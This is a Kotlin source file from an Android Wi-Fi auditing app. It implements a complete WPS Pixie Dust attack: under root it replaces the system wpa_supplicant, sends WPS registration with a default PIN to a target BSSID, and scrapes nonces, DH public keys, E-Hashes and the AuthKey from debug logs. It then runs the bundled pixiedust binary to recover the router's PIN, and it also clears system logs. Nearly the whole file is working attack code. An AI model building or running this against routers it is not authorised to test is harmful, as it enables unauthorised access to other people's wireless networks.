package com.lsd.wififrankenstein.ui.pixiedust

import android.content.Context
import android.os.Build
import android.util.Log
import com.lsd.wififrankenstein.R
import com.topjohnwu.superuser.Shell
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.StringReader

class PixieDustHelper(
    private val context: Context,
    private val callbacks: PixieDustCallbacks
) {

    companion object {
        private const val TAG = "PixieDustHelper"
        private const val CONFIG_FILE = "wpa_supplicant.conf"
        private const val DEFAULT_PIN = "12345670"
        private const val TIMEOUT = 30000L
        private const val APP_PACKAGE = "com.lsd.wififrankenstein"
    }

    private var attackJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val binaryDir = context.filesDir.absolutePath

    interface PixieDustCallbacks {
        fun onStateChanged(state: PixieAttackState)
        fun onProgressUpdate(message: String)
        fun onAttackCompleted(result: PixieResult)
        fun onAttackFailed(error: String, errorCode: Int)
    }

    fun checkRootAccess(): Boolean {
        return try {
            val shell = Shell.getShell()
            shell.isRoot && shell.isAlive
        } catch (e: Exception) {
            Log.e(TAG, "Root check failed", e)
            false
        }
    }

    fun checkBinaryFiles(): Boolean {
        val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"
        val requiredBinaries = listOf(
            "wpa_supplicant$arch",
            "wpa_cli$arch",
            "pixiedust$arch",
            CONFIG_FILE
        )

        return requiredBinaries.all { fileName ->
            val file = java.io.File(binaryDir, fileName)
            val exists = file.exists() && file.canRead() && file.length() > 0
            Log.d(TAG, "Binary $fileName: exists=$exists, size=${file.length()}")
            exists
        }
    }

    fun copyBinariesFromAssets() {
        scope.launch {
            try {
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_copying_binaries))

                val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"
                val binaries = listOf(
                    "wpa_supplicant$arch",
                    "wpa_cli$arch",
                    "pixiedust$arch",
                    CONFIG_FILE
                )

                val libraries = listOf(
                    "libssl.so.1.1",
                    "libssl.so.3",
                    "libcrypto.so.1.1",
                    "libcrypto.so.3",
                    "libnl-3.so$arch",
                    "libnl-genl-3.so$arch",
                    "libnl-route-3.so$arch"
                )

                binaries.forEach { fileName ->
                    if (copyAssetToInternalStorage(fileName, fileName)) {
                        Shell.cmd("chmod 755 $binaryDir/$fileName").exec()
                    }
                }

                libraries.forEach { libName ->
                    copyAssetToInternalStorage(libName, libName)
                    Shell.cmd("chmod 755 $binaryDir/$libName").exec()
                }

                createLibrarySymlinks()
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_binaries_ready))

            } catch (e: Exception) {
                Log.e(TAG, "Error copying binaries", e)
                callbacks.onAttackFailed(context.getString(R.string.pixiedust_error_copying_binaries), -10)
            }
        }
    }

    private fun createLibrarySymlinks() {
        val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"
        val symlinkCommands = listOf(
            "cd $binaryDir && ln -sf libnl-3.so$arch libnl-3.so",
            "cd $binaryDir && ln -sf libnl-genl-3.so$arch libnl-genl-3.so",
            "cd $binaryDir && ln -sf libnl-route-3.so$arch libnl-route-3.so"
        )

        symlinkCommands.forEach { command ->
            Shell.cmd(command).exec()
        }
    }

    private fun copyAssetToInternalStorage(assetName: String, fileName: String): Boolean {
        return try {
            context.assets.open(assetName).use { input ->
                context.openFileOutput(fileName, Context.MODE_PRIVATE).use { output ->
                    input.copyTo(output)
                }
            }
            true
        } catch (e: Exception) {
            Log.w(TAG, "Failed to copy $assetName", e)
            false
        }
    }

    fun startPixieAttack(network: WpsNetwork) {
        if (attackJob?.isActive == true) {
            Log.w(TAG, "Attack already in progress")
            return
        }

        attackJob = scope.launch {
            try {
                callbacks.onStateChanged(PixieAttackState.CheckingRoot)
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_checking_root))

                if (!checkRootAccess()) {
                    callbacks.onAttackFailed(context.getString(R.string.pixiedust_root_not_available), -1)
                    return@launch
                }

                if (!checkBinaryFiles()) {
                    copyBinariesFromAssets()
                    delay(3000)

                    if (!checkBinaryFiles()) {
                        callbacks.onAttackFailed(context.getString(R.string.pixiedust_binary_files_not_available), -2)
                        return@launch
                    }
                }

                callbacks.onStateChanged(PixieAttackState.Preparing)
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_preparing_attack))

                clearLogs()

                stopExistingProcesses()
                delay(3000)

                val startTime = System.currentTimeMillis()
                val socketDir = getSocketDirectory()

                if (!startSupplicant(socketDir)) {
                    callbacks.onAttackFailed(context.getString(R.string.pixiedust_failed_start_supplicant), -3)
                    return@launch
                }

                delay(3000)

                callbacks.onStateChanged(PixieAttackState.ExtractingData)
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_extracting_handshake))

                performWpsRegistration(network, socketDir)
                delay(8000)

                val attackData = extractPixieData()
                if (attackData == null) {
                    Log.e(TAG, "=== FULL SUPPLICANT LOG OUTPUT ===")
                    dumpFullSupplicantLog()
                    callbacks.onAttackFailed(context.getString(R.string.pixiedust_failed_extract_data), -4)
                    return@launch
                }

                callbacks.onStateChanged(PixieAttackState.RunningAttack)
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_computing_pin))

                val pin = executePixieAttack(attackData)
                val duration = System.currentTimeMillis() - startTime

                val result = PixieResult(
                    network = network,
                    pin = pin,
                    success = pin != null,
                    duration = duration
                )

                callbacks.onStateChanged(PixieAttackState.Completed(result))
                callbacks.onAttackCompleted(result)

            } catch (e: Exception) {
                Log.e(TAG, "PixieDust attack failed", e)
                callbacks.onAttackFailed(context.getString(R.string.pixiedust_attack_error, e.message ?: "Unknown"), -5)
            }
        }
    }

    private fun clearLogs() {
        Shell.cmd("logcat -c").exec()
        Shell.cmd("dmesg -c").exec()
    }

    private suspend fun dumpFullSupplicantLog() {
        withContext(Dispatchers.IO) {
            try {
                Log.e(TAG, "=== DUMPING ALL AVAILABLE LOGS ===")

                val pixieLogs = Shell.cmd("logcat -d -s pixie").exec()
                Log.e(TAG, "PIXIE LOGS:\n${pixieLogs.out.joinToString("\n")}")

                val logcatWps = Shell.cmd("logcat -d | grep -i wps").exec()
                Log.e(TAG, "WPS RELATED LOGS:\n${logcatWps.out.joinToString("\n")}")

                val dmesgOutput = Shell.cmd("dmesg | grep -E \"wpa|wps|supplicant\"").exec()
                Log.e(TAG, "DMESG WPA OUTPUT:\n${dmesgOutput.out.joinToString("\n")}")

                val supplicantProcess = Shell.cmd("ps | grep wpa_supplicant").exec()
                Log.e(TAG, "SUPPLICANT PROCESSES:\n${supplicantProcess.out.joinToString("\n")}")

                val socketDir = getSocketDirectory()
                val socketCheck = Shell.cmd("ls -la $socketDir").exec()
                Log.e(TAG, "SOCKET DIRECTORY:\n${socketCheck.out.joinToString("\n")}")

            } catch (e: Exception) {
                Log.e(TAG, "Failed to dump logs", e)
            }
        }
    }

    private fun getSocketDirectory(): String {
        return if (Build.VERSION.SDK_INT >= 28) {
            "/data/vendor/wifi/wpa/wififrankenstein/"
        } else {
            "/data/misc/wifi/wififrankenstein/"
        }
    }

    private suspend fun startSupplicant(socketDir: String): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                Log.d(TAG, "Disabling WiFi and killing existing processes")
                Shell.cmd("svc wifi disable").exec()
                delay(3000)

                Shell.cmd("pkill -9 wpa_supplicant").exec()
                Shell.cmd("pkill -9 hostapd").exec()
                delay(2000)

                Log.d(TAG, "Creating and cleaning socket directory: $socketDir")
                Shell.cmd("rm -rf $socketDir").exec()
                Shell.cmd("mkdir -p $socketDir").exec()
                Shell.cmd("chmod 777 $socketDir").exec()

                Shell.cmd("rm -rf /data/misc/wifi/wpswpatester/").exec()
                Shell.cmd("rm -rf /data/vendor/wifi/wpa/wpswpatester/").exec()
                Shell.cmd("rm -rf /data/vendor/wifi/wpa/wififrankenstein/").exec()

                val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"

                val command1 = "cd $binaryDir && export LD_LIBRARY_PATH=$binaryDir && " +
                        "nohup ./wpa_supplicant$arch -dd -Dnl80211,wext,hostapd,wired -i wlan0 " +
                        "-c$binaryDir/$CONFIG_FILE -O$socketDir 2>&1 | while read line; do log -t pixie \"\$line\"; done &"

                val command2 = "cd $binaryDir && export LD_LIBRARY_PATH=$binaryDir && " +
                        "nohup ./wpa_supplicant$arch -dd -Dnl80211,wext,hostapd,wired -i wlan0 " +
                        "-c$binaryDir/$CONFIG_FILE -O$socketDir &"

                Log.d(TAG, "Trying supplicant start with log redirection")
                var result = Shell.cmd(command1).exec()
                Log.d(TAG, "Command1 result: success=${result.isSuccess}, out=${result.out}, err=${result.err}")

                delay(5000)
                var socketFile = "$socketDir/wlan0"
                var socketExists = Shell.cmd("test -S $socketFile && echo 'exists' || echo 'missing'").exec()

                if (!socketExists.out.contains("exists")) {
                    Log.d(TAG, "First method failed, trying simple start")
                    Shell.cmd("pkill -9 wpa_supplicant").exec()
                    Shell.cmd("rm -rf $socketDir").exec()
                    Shell.cmd("mkdir -p $socketDir").exec()
                    Shell.cmd("chmod 777 $socketDir").exec()
                    delay(2000)

                    result = Shell.cmd(command2).exec()
                    Log.d(TAG, "Command2 result: success=${result.isSuccess}, out=${result.out}, err=${result.err}")
                    delay(5000)
                    socketExists = Shell.cmd("test -S $socketFile && echo 'exists' || echo 'missing'").exec()

                    if (!socketExists.out.contains("exists")) {
                        Log.d(TAG, "Standard socket failed, trying alternative location")
                        Shell.cmd("pkill -9 wpa_supplicant").exec()
                        delay(2000)

                        val altSocketDir = "/data/data/com.lsd.wififrankenstein/files/sockets/"
                        Shell.cmd("rm -rf $altSocketDir").exec()
                        Shell.cmd("mkdir -p $altSocketDir").exec()
                        Shell.cmd("chmod 777 $altSocketDir").exec()

                        val command3 = "cd $binaryDir && export LD_LIBRARY_PATH=$binaryDir && " +
                                "nohup ./wpa_supplicant$arch -dd -Dnl80211,wext,hostapd,wired -i wlan0 " +
                                "-c$binaryDir/$CONFIG_FILE -O$altSocketDir 2>&1 | while read line; do log -t pixie \"\$line\"; done &"

                        result = Shell.cmd(command3).exec()
                        Log.d(TAG, "Command3 (alt socket) result: success=${result.isSuccess}")
                        delay(5000)

                        socketFile = "$altSocketDir/wlan0"
                        socketExists = Shell.cmd("test -S $socketFile && echo 'exists' || echo 'missing'").exec()

                        if (socketExists.out.contains("exists")) {
                            Log.d(TAG, "Alternative socket location worked: $altSocketDir")
                        }
                    }
                }

                val processCheck = Shell.cmd("ps | grep wpa_supplicant | grep -v grep").exec()
                Log.d(TAG, "Supplicant processes: ${processCheck.out}")

                val success = socketExists.out.contains("exists")
                Log.d(TAG, "Supplicant start success: $success, socket exists: ${socketExists.out}")

                if (success) {
                    delay(3000)
                    val pixieCheck = Shell.cmd("logcat -d -s pixie | tail -20").exec()
                    Log.d(TAG, "Initial pixie logs:\n${pixieCheck.out.joinToString("\n")}")

                    val statusCheck = Shell.cmd("cd $binaryDir && export LD_LIBRARY_PATH=$binaryDir && ./wpa_cli$arch -g$socketFile status").exec()
                    Log.d(TAG, "WPA supplicant status: ${statusCheck.out}")

                    val interfaceCheck = Shell.cmd("cd $binaryDir && export LD_LIBRARY_PATH=$binaryDir && ./wpa_cli$arch -g$socketFile interface").exec()
                    Log.d(TAG, "WPA supplicant interfaces: ${interfaceCheck.out}")

                    if (statusCheck.out.any { it.contains("INACTIVE") || it.contains("DISCONNECTED") }) {
                        Log.d(TAG, "Supplicant ready for WPS commands")
                    } else {
                        Log.w(TAG, "Supplicant in unexpected state")
                    }
                }

                return@withContext success

            } catch (e: Exception) {
                Log.e(TAG, "Failed to start supplicant", e)
                false
            }
        }
    }

    private suspend fun performWpsRegistration(network: WpsNetwork, socketDir: String) {
        withContext(Dispatchers.IO) {
            try {
                val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"

                val possibleSockets = listOf(
                    "$socketDir/wlan0",
                    "/data/data/com.lsd.wififrankenstein/files/sockets/wlan0"
                )

                var workingSocket: String? = null
                for (socketPath in possibleSockets) {
                    val socketExists = Shell.cmd("test -S $socketPath && echo 'exists' || echo 'missing'").exec()
                    if (socketExists.out.contains("exists")) {
                        workingSocket = socketPath
                        Log.d(TAG, "Found working socket: $socketPath")
                        break
                    }
                }

                if (workingSocket == null) {
                    Log.e(TAG, "No working socket found")
                    return@withContext
                }

                Log.d(TAG, "Starting WPS registration for BSSID: ${network.bssid}")

                val commands = listOf(
                    "cd $binaryDir && export LD_LIBRARY_PATH=$binaryDir && " +
                            "./wpa_cli$arch -g$workingSocket -i wlan0 wps_reg ${network.bssid} $DEFAULT_PIN",

                    "cd $binaryDir && export LD_LIBRARY_PATH=$binaryDir && " +
                            "./wpa_cli$arch -g$workingSocket wps_reg ${network.bssid} $DEFAULT_PIN"
                )

                for (index in commands.indices) {
                    val command = commands[index]
                    Log.d(TAG, "Executing WPS command $index: $command")
                    val result = Shell.cmd(command).exec()
                    Log.d(TAG, "WPS command $index result: success=${result.isSuccess}")
                    Log.d(TAG, "WPS command $index output: ${result.out}")
                    Log.d(TAG, "WPS command $index error: ${result.err}")

                    delay(3000)

                    val pixieLogs = Shell.cmd("logcat -d -s pixie | tail -30").exec()
                    Log.d(TAG, "Recent pixie logs after command $index:\n${pixieLogs.out.joinToString("\n")}")

                    if (result.out.any { it.contains("OK") }) {
                        Log.d(TAG, "WPS command accepted, waiting for registration process...")
                        delay(8000)

                        val supplicantStatus = Shell.cmd("cd $binaryDir && export LD_LIBRARY_PATH=$binaryDir && ./wpa_cli$arch -g$workingSocket status").exec()
                        Log.d(TAG, "Supplicant status after WPS: ${supplicantStatus.out}")

                        val recentActivity = Shell.cmd("logcat -d -s pixie | tail -50").exec()
                        Log.d(TAG, "Recent supplicant activity:\n${recentActivity.out.joinToString("\n")}")
                        break
                    }
                }

                delay(5000)

                val finalPixieLogs = Shell.cmd("logcat -d -s pixie").exec()
                Log.d(TAG, "=== FINAL PIXIE LOGS ===\n${finalPixieLogs.out.joinToString("\n")}")

            } catch (e: Exception) {
                Log.w(TAG, "WPS registration failed", e)
            }
        }
    }

    private suspend fun stopExistingProcesses() {
        withContext(Dispatchers.IO) {
            try {
                Log.d(TAG, "Aggressively stopping all wpa_supplicant processes")

                Shell.cmd("pkill -f wpa_supplicant").exec()
                Shell.cmd("pkill -f wpa_cli").exec()
                Shell.cmd("pkill -f pixiedust").exec()
                Shell.cmd("killall wpa_supplicant").exec()

                val runningProcesses = Shell.cmd("ps | grep wpa_supplicant | grep -v grep").exec()
                runningProcesses.out.forEach { processLine ->
                    if (processLine.isNotBlank()) {
                        val parts = processLine.trim().split("\\s+".toRegex())
                        if (parts.size >= 2) {
                            val pid = parts[1]
                            Log.d(TAG, "Killing remaining wpa_supplicant process: $pid")
                            Shell.cmd("kill -9 $pid").exec()
                        }
                    }
                }

                val socketDirs = listOf(
                    "/data/misc/wifi/wififrankenstein/",
                    "/data/vendor/wifi/wpa/wififrankenstein/",
                    "/data/misc/wifi/wpswpatester/",
                    "/data/vendor/wifi/wpa/wpswpatester/",
                    "/data/data/com.lsd.wififrankenstein/files/sockets/"
                )

                socketDirs.forEach { dir ->
                    Shell.cmd("fuser -k $dir 2>/dev/null || true").exec()
                    Shell.cmd("rm -rf $dir").exec()
                }

                delay(2000)

            } catch (e: Exception) {
                Log.w(TAG, "Error stopping processes", e)
            }
        }
    }

    private suspend fun extractPixieData(): PixieAttackData? {
        return withContext(Dispatchers.IO) {
            try {
                delay(3000)

                val logSources = listOf(
                    "logcat -d -s pixie",
                    "logcat -d | grep -E \"hexdump|Enrollee Nonce|DH.*Public Key|AuthKey|E-Hash\"",
                    "dmesg | grep -E \"hexdump|Enrollee Nonce|DH.*Public Key|AuthKey|E-Hash\""
                )

                var combinedLogs = ""

                logSources.forEach { command ->
                    val result = Shell.cmd(command).exec()
                    if (result.isSuccess) {
                        combinedLogs += result.out.joinToString("\n") + "\n"
                    }
                }

                Log.d(TAG, "=== SEARCHING FOR PIXIE DATA IN LOGS ===")
                Log.d(TAG, "Combined log length: ${combinedLogs.length}")

                return@withContext parsePixieDataFromLogs(combinedLogs)

            } catch (e: Exception) {
                Log.e(TAG, "Failed to extract pixie data", e)
                null
            }
        }
    }

    private fun parsePixieDataFromLogs(logs: String): PixieAttackData? {
        var enrolleeNonce: String? = null
        var ownPublicKey: String? = null
        var peerPublicKey: String? = null
        var authKey: String? = null
        var hashOne: String? = null
        var hashTwo: String? = null

        val lines = logs.split("\n")

        for (i in lines.indices) {
            val line = lines[i]

            when {
                line.contains("Enrollee Nonce") && line.contains("hexdump(len=16):") && enrolleeNonce == null -> {
                    enrolleeNonce = extractHexDataClean(line)
                    if (enrolleeNonce?.isNotBlank() == true) {
                        Log.d(TAG, "Found Enrollee Nonce: $enrolleeNonce")
                    }
                }

                line.contains("DH own Public Key") && line.contains("hexdump(len=192):") && ownPublicKey == null -> {
                    ownPublicKey = extractHexDataClean(line)
                    if (ownPublicKey?.isNotBlank() == true) {
                        Log.d(TAG, "Found DH own Public Key: $ownPublicKey")
                    }
                }

                line.contains("DH peer Public Key") && line.contains("hexdump(len=192):") && peerPublicKey == null -> {
                    peerPublicKey = extractHexDataClean(line)
                    if (peerPublicKey?.isNotBlank() == true) {
                        Log.d(TAG, "Found DH peer Public Key: $peerPublicKey")
                    }
                }

                line.contains("E-Hash1") && line.contains("hexdump(len=32):") && hashOne == null -> {
                    hashOne = extractHexDataClean(line)
                    if (hashOne?.isNotBlank() == true) {
                        Log.d(TAG, "Found E-Hash1: $hashOne")
                    }
                }

                line.contains("E-Hash2") && line.contains("hexdump(len=32):") && hashTwo == null -> {
                    hashTwo = extractHexDataClean(line)
                    if (hashTwo?.isNotBlank() == true) {
                        Log.d(TAG, "Found E-Hash2: $hashTwo")
                    }
                }

                line.contains("AuthKey") && line.contains("hexdump(len=32):") && authKey == null -> {
                    val extracted = extractHexDataClean(line)
                    if (extracted?.isNotBlank() == true && !extracted.contains("[REMOVED]")) {
                        authKey = extracted
                        Log.d(TAG, "Found AuthKey: $authKey")
                    } else if (extracted?.contains("[REMOVED]") == true) {
                        authKey = tryExtractAuthKeyFromContext(lines, i)
                        if (authKey?.isNotBlank() == true) {
                            Log.d(TAG, "Found AuthKey from context: $authKey")
                        }
                    }
                }
            }

            if (enrolleeNonce != null && ownPublicKey != null && peerPublicKey != null &&
                authKey != null && hashOne != null && hashTwo != null) {
                break
            }
        }

        val foundValues = listOfNotNull(enrolleeNonce, ownPublicKey, peerPublicKey, authKey, hashOne, hashTwo).size
        Log.d(TAG, "Pixie data extraction complete: $foundValues/6 values found")

        return if (foundValues == 6) {
            PixieAttackData(
                peerPublicKey = peerPublicKey!!,
                ownPublicKey = ownPublicKey!!,
                hashOne = hashOne!!,
                hashTwo = hashTwo!!,
                authenticationKey = authKey!!,
                enrolleeNonce = enrolleeNonce!!
            )
        } else {
            Log.w(TAG, "Incomplete pixie data: $foundValues/6")
            null
        }
    }


    private fun extractHexDataClean(line: String): String? {
        return try {
            val hexdumpIndex = line.indexOf("hexdump(len=")
            if (hexdumpIndex == -1) return null

            val colonIndex = line.indexOf(":", hexdumpIndex)
            if (colonIndex == -1) return null

            val hexPart = line.substring(colonIndex + 1).trim()

            if (hexPart.contains("[REMOVED]") || hexPart.contains("[NULL]")) {
                return hexPart
            }

            return hexPart.replace("\\s+".toRegex(), "")
        } catch (e: Exception) {
            Log.w(TAG, "Failed to extract hex data from: $line", e)
            null
        }
    }

    private fun tryExtractAuthKeyFromContext(lines: List<String>, currentIndex: Int): String? {
        for (i in (currentIndex - 10).coerceAtLeast(0) until (currentIndex + 10).coerceAtMost(lines.size)) {
            val line = lines[i]
            if (line.contains("KDK") && line.contains("hexdump(len=32):")) {
                val extracted = extractHexDataClean(line)
                if (extracted?.isNotBlank() == true && !extracted.contains("[REMOVED]")) {
                    Log.d(TAG, "Using KDK as AuthKey fallback")
                    return extracted
                }
            }

            if (line.contains("EMSK") && line.contains("hexdump(len=32):")) {
                val extracted = extractHexDataClean(line)
                if (extracted?.isNotBlank() == true && !extracted.contains("[REMOVED]")) {
                    Log.d(TAG, "Using EMSK as AuthKey fallback")
                    return extracted
                }
            }
        }
        return null
    }

    private suspend fun executePixieAttack(data: PixieAttackData): String? {
        return withContext(Dispatchers.IO) {
            try {
                val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"
                val command = "cd $binaryDir && export LD_LIBRARY_PATH=$binaryDir && " +
                        "( cmdpid=\$BASHPID; (sleep 30; kill \$cmdpid) & exec ./pixiedust$arch --force ${data.toCommandArgs()})"

                Log.d(TAG, "Executing pixie attack with data: ${data.toCommandArgs()}")
                val result = Shell.cmd(command).exec()

                if (result.isSuccess) {
                    val output = result.out.joinToString("\n")
                    Log.d(TAG, "Pixie output: $output")
                    return@withContext parsePixieOutput(output)
                } else {
                    Log.e(TAG, "PixieDust execution failed: ${result.err}")
                    return@withContext null
                }

            } catch (e: Exception) {
                Log.e(TAG, "PixieDust execution error", e)
                null
            }
        }
    }

    private fun parsePixieOutput(output: String): String? {
        BufferedReader(StringReader(output)).use { reader ->
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                line?.let { outputLine ->
                    when {
                        outputLine.contains("not found") -> {
                            Log.d(TAG, "PIN not found")
                            return null
                        }
                        outputLine.contains("WPS pin") -> {
                            val pin = outputLine.split(":")[1].trim()
                            Log.d(TAG, "PIN found: $pin")
                            return pin
                        }
                    }
                }
            }
        }
        return null
    }

    fun stopAttack() {
        attackJob?.cancel()
        scope.launch {
            Shell.cmd("pkill -f wpa_supplicant").exec()
            Shell.cmd("pkill -f wpa_cli").exec()
            Shell.cmd("pkill -f pixiedust").exec()
            callbacks.onProgressUpdate(context.getString(R.string.pixiedust_attack_stopped))
        }
    }

    fun testWpsCommands(network: WpsNetwork) {
        scope.launch {
            try {
                val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"
                val socketDir = getSocketDirectory()
                val socketPath = "$socketDir/wlan0"

                Log.d(TAG, "=== TESTING WPS COMMANDS ===")

                val testCommands = listOf(
                    "cd $binaryDir && export LD_LIBRARY_PATH=$binaryDir && ./wpa_cli$arch -g$socketPath status",
                    "cd $binaryDir && export LD_LIBRARY_PATH=$binaryDir && ./wpa_cli$arch -g$socketPath scan",
                    "cd $binaryDir && export LD_LIBRARY_PATH=$binaryDir && ./wpa_cli$arch -g$socketPath scan_results",
                    "cd $binaryDir && export LD_LIBRARY_PATH=$binaryDir && ./wpa_cli$arch -g$socketPath wps_pin any $DEFAULT_PIN",
                    "cd $binaryDir && export LD_LIBRARY_PATH=$binaryDir && ./wpa_cli$arch -g$socketPath wps_reg ${network.bssid} $DEFAULT_PIN"
                )

                testCommands.forEachIndexed { index, command ->
                    Log.d(TAG, "Test command $index: ${command.substringAfterLast("./wpa_cli")}")
                    val result = Shell.cmd(command).exec()
                    Log.d(TAG, "Test result $index: success=${result.isSuccess}")
                    Log.d(TAG, "Test output $index: ${result.out}")
                    Log.d(TAG, "Test error $index: ${result.err}")
                    delay(1000)
                }

            } catch (e: Exception) {
                Log.e(TAG, "Test commands failed", e)
            }
        }
    }

    fun cleanup() {
        stopAttack()
        scope.cancel()
    }
}